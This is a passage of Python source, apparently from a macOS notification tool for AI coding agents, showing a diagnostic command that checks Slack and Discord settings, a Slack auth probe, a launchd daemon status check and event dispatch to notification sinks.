        for name, ws in config.slack_workspaces.items():
            badges = []
            badges.append("enabled" if ws.enabled else "disabled")
            if ws.bot_token:
                badges.append("bot")
            if ws.app_token:
                badges.append("app")
            if ws.webhook_url:
                badges.append("webhook")
            if ws.actionable_approvals:
                badges.append("actionable")
            print(f"  {name}: {', '.join(badges)}  channel={ws.channel or '(unset)'}")
            if ws.enabled and ws.bot_token:
                ok, msg = _doctor_probe_slack_auth(ws.bot_token)
                marker = "✓" if ok else "✗"
                print(f"    {marker} auth.test: {msg}")
            if ws.actionable_approvals:
                n_users = len(ws.approver_user_ids)
                n_groups = len(ws.approver_user_groups)
                line = f"    approvers: {n_users} user(s), {n_groups} group(s)"
                if n_users == 0 and n_groups == 0 and (ws.channel or "@me") == "@me":
                    line += "  (DM-only — only the installing user can click)"
                print(line)
    else:
        print("Slack workspaces: (none configured)")
    print(f"Discord: enabled={config.discord.enabled} webhook={bool(config.discord.webhook_url)}")

    if config.routes:
        print(f"Routes:  {len(config.routes)} configured (strict: unmatched paths skipped)")
        matched = match_route(Path.cwd(), config)
        if matched is not None:
            print(f"    cwd={Path.cwd()} → matches {matched.cwd!r}")
        else:
            print(
                f"    cwd={Path.cwd()} → NO ROUTE MATCHES — notifications for this "
                f"path will be skipped. Add a `[[routes]]` entry or a `cwd = \"*\"` "
                f"catch-all if you want coverage here."
            )

    # Daemon required when any workspace turns on actionable approvals.
    actionable_workspaces = [
        n for n, ws in config.slack_workspaces.items() if ws.actionable_approvals
    ]
    if actionable_workspaces:
        print(f"Daemon: required by actionable_approvals=true on {actionable_workspaces}")
        _doctor_check_daemon()
    else:
        print("Daemon: not required (no actionable_approvals workspaces)")

    state = _snapshot_state()
    print(f"System: idle={state.idle_seconds}s frontmost={state.frontmost_app!r}")

    claude_settings = Path.home() / ".claude" / "settings.json"
    print(f"Claude settings: {claude_settings}  {'(exists)' if claude_settings.exists() else '(missing)'}")
    codex_config = Path.home() / ".codex" / "config.toml"
    print(f"Codex config:    {codex_config}  {'(exists)' if codex_config.exists() else '(missing)'}")
    return 0


def _doctor_probe_slack_auth(bot_token: str) -> tuple[bool, str]:
    """Call Slack auth.test with a short timeout. Returns (ok, message)."""
    from .sinks.base import http_post_json
    try:
        status, body = http_post_json(
            "https://slack.com/api/auth.test",
            {},
            headers={"Authorization": f"Bearer {bot_token}"},
            timeout=3.0,
        )
    except Exception as e:  # noqa: BLE001
        return False, f"network error: {e}"
    if status >= 300:
        return False, f"HTTP {status}"
    try:
        parsed = json.loads(body)
    except ValueError:
        return False, "non-JSON response"
    if not parsed.get("ok"):
        return False, f"Slack API error: {parsed.get('error', 'unknown')}"
    team = parsed.get("team") or "?"
    user = parsed.get("user") or "?"
    return True, f"team={team} user={user}"


def _doctor_check_daemon() -> None:
    """Print launchd + log status for the daemon. Best-effort — failures
    surface as advisory text, never raise."""
    import shutil as _shutil
    import subprocess as _subprocess
    plist_path = Path.home() / "Library" / "LaunchAgents" / f"{install.LAUNCHD_LABEL}.plist"
    if plist_path.exists():
        print(f"  ✓ plist:  {plist_path}")
    else:
        print(
            f"  ✗ plist:  {plist_path} MISSING — run `agent-notify install slack-bot`"
        )
        return
    launchctl = _shutil.which("launchctl")
    if launchctl:
        try:
            res = _subprocess.run(
                [launchctl, "list", install.LAUNCHD_LABEL],
                capture_output=True, text=True, timeout=3,
            )
        except (OSError, _subprocess.SubprocessError) as e:
            print(f"  ? launchctl: could not query daemon status: {e}")
        else:
            if res.returncode == 0:
                print(f"  ✓ launchctl: {install.LAUNCHD_LABEL} is loaded")
            else:
                print(
                    f"  ✗ launchctl: {install.LAUNCHD_LABEL} not loaded — "
                    f"start it with `launchctl bootstrap gui/$UID {plist_path}`"
                )
    log_path = paths.daemon_log()
    if log_path.exists() and log_path.stat().st_size > 0:
        mtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(log_path.stat().st_mtime))
        print(f"  ✓ log:    {log_path}  (last activity: {mtime})")
    else:
        print(f"  ? log:    {log_path}  (no activity yet — daemon may never have started)")


# ---- helpers ----


def _snapshot_state() -> SystemState:
    return SystemState(
        idle_seconds=macos.idle_seconds(),
        frontmost_app=macos.frontmost_app(),
    )


def _dispatch(event: Event, config: Config) -> None:
    resolved = sinks_for(event.cwd, config)
    if resolved is None:
        print(
            f"agent-notify: no [[routes]] entry matches {event.cwd} — skipping "
            f"to avoid cross-project leakage. Add a route (or `cwd = \"*\"` "
            f"catch-all) to re-enable notifications for this path.",
            file=sys.stderr,
        )
        return
    slack_cfg, discord_cfg = resolved
    sinks: list[Sink] = []
    if slack_cfg.enabled:
        sinks.append(SlackSink(
            slack_cfg,
            tool_input_max_chars=config.tool_input_max_chars,
            verbosity=config.display.verbosity,
            message_max_chars=config.display.message_max_chars,
            message_preview_head_chars=config.display.message_preview_head_chars,
            message_preview_tail_chars=config.display.message_preview_tail_chars,
            workspace=workspace_for(event.cwd, config),
        ))
    if discord_cfg.enabled:
        sinks.append(DiscordSink(
            discord_cfg,
            tool_input_max_chars=config.tool_input_max_chars,
            verbosity=config.display.verbosity,
            message_max_chars=config.display.message_max_chars,
        ))
    for sink in sinks:
        try:
            sink.send(event)
        except SinkError as e:
            print(f"agent-notify: {sink.name} sink failed: {e}", file=sys.stderr)
